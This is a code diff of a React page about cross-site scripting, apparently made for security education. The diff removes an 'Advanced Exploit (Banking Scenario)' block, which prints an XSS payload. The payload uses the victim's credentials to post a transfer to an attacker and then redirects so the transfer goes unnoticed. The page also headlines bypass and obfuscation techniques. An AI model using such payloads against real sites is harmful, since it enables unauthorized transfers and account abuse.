@@ -55,22 +55,6 @@ export default function XSSPage() {
               <p className="text-sm text-gray-400 mt-1">Simple proof-of-concept demonstrating script execution in victims browser</p>
             </div>
 
-            <div>
-              <h4 className="font-medium mb-1">Advanced Exploit (Banking Scenario):</h4>
-              <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://bank.com/transfer?amount=1000&to=attacker
-<script>
-  fetch('/api/transfer', {
-    method: 'POST',
-    body: JSON.stringify({amount:5000,to:'ATTACKER'}),
-    credentials: 'include'
-  }).then(() => {
-    window.location = 'http://bank.com/confirmation'
-  })
-</script>`}
-              </pre>
-              <p className="text-sm text-gray-400 mt-1">Silently performs unauthorized transfer while maintaining appearance of legitimacy</p>
-            </div>
 
             <div className="p-3 bg-red-900/30 rounded">
               <h4 className="font-medium mb-2">Bypass Techniques and Obfuscation:</h4>
